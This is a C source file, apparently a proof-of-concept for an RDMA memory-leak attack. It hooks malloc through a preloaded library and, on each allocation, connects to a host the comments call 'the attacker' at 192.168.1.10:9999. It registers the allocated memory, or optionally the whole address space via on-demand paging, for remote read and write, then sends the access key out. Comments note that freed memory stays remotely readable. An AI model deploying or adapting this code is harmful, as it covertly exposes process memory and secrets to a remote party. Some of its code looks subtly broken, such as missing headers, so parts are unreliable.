#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <dlfcn.h>
#include <rdma/rdma_cma.h>
#include <rdma/rdma_verbs.h>
#include <infiniband/verbs.h>

static __thread int no_hook;

static unsigned char buffer[8192];

void preload(void *);

static void *(*real_malloc)(size_t) = NULL;
static void *(*real_calloc)(size_t, size_t) = NULL;
static void *(*real_realloc)(void *, size_t) = NULL;
static void (*real_free)(void *) = NULL;

static void __attribute__((constructor))init(void) {
  real_malloc = (void * (*)(size_t))dlsym(RTLD_NEXT, "malloc");
  real_calloc = (void * (*)(size_t, size_t))dlsym(RTLD_NEXT, "calloc");
  real_realloc = (void * (*)(void *, size_t))dlsym(RTLD_NEXT, "realloc");
  real_free = (void (*)(void *))dlsym(RTLD_NEXT, "free");
}

void *malloc(size_t len) {
  void* ret;

  if (!real_malloc) init();

  if (no_hook) {
    return (*real_malloc)(len);
  }

  no_hook = 1;
  printf("malloc call: %zu bytes\n", len);
  ret = (*real_malloc)(len); 
  preload(ret);
  no_hook = 0; 
  return ret; 
}

void free(void *ptr) {
  if (!real_free) init();
  if (!ptr) return;
  (*real_free)(ptr);
}

void *calloc(size_t nmem, size_t size) {
  if (real_calloc == NULL)
    return buffer;
  
  init();

  return (*real_calloc)(nmem, size); 
}

void *realloc(void *ptr, size_t size) {
  if (!real_realloc) init();
  return (*real_realloc)(ptr, size);
}

void preload(void *ptr){

  struct rdma_addrinfo *addrinfo;
  int ret;
  struct rdma_addrinfo hints;
  memset(&hints, 0, sizeof hints);
  hints.ai_port_space = RDMA_PS_TCP;

  // should be IP and port of the attacker
  ret = rdma_getaddrinfo("192.168.1.10","9999", &hints, &addrinfo);
  assert(ret==0 && "Failed to find route to the attacker");

  struct ibv_qp_init_attr attr;
  struct rdma_conn_param conn_param;

  memset(&attr, 0, sizeof(attr));
  attr.cap.max_send_wr = 1;
  attr.cap.max_recv_wr = 1;
  attr.cap.max_send_sge = 1;
  attr.cap.max_recv_sge = 1;
  attr.cap.max_inline_data = sizeof(struct ibv_sge);
  attr.qp_type = IBV_QPT_RC;
  memset(&conn_param, 0 , sizeof(conn_param));
  conn_param.responder_resources = 2;
  conn_param.initiator_depth =  2;
  conn_param.retry_count = 3;  
  conn_param.rnr_retry_count = 3;  
  struct ibv_pd* pd = NULL;
  struct rdma_cm_id *id;
  ret = rdma_create_ep(&id, addrinfo, NULL, NULL);
  ret = rdma_create_qp(id, pd, &attr);
  ret = rdma_connect(id, &conn_param);
  pd = id->qp->pd;
  //char* ptr = (char*)malloc(128);
  
  
  // change to true to use implicit ODP.
  bool useodp = false;

  struct ibv_mr * mrall = NULL;
  if(useodp)
    mrall = ibv_reg_mr(pd,NULL,SIZE_MAX,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ | IBV_ACCESS_ON_DEMAND);
  else
    mrall = ibv_reg_mr(pd,ptr,128,IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_WRITE| IBV_ACCESS_REMOTE_READ);

  struct ibv_sge* sges = (struct ibv_sge*)ptr;
  sges[0].addr = (uint64_t)(ptr);
  sges[0].lkey = mrall->rkey;
  {
      struct ibv_sge sge;
      sge.addr = sges[0].addr;
      sge.length = sizeof(struct ibv_sge);
      sge.lkey = 0 ;
      struct ibv_send_wr wr, *bad;

      wr.wr_id = 0;
      wr.next = NULL;
      wr.sg_list = &sge;
      wr.num_sge = 1;
      wr.opcode = IBV_WR_SEND;
      wr.send_flags = IBV_SEND_INLINE | IBV_SEND_SIGNALED;
      int ret = ibv_post_send(id->qp, &wr, &bad);
      assert(ret==0 && "Failed to send memory information to the attacker");
  }
//  printf("Attacker expects secret at %p \n",ptr);

  //free(ptr); // free memory, but it is still RDMA accesible
}
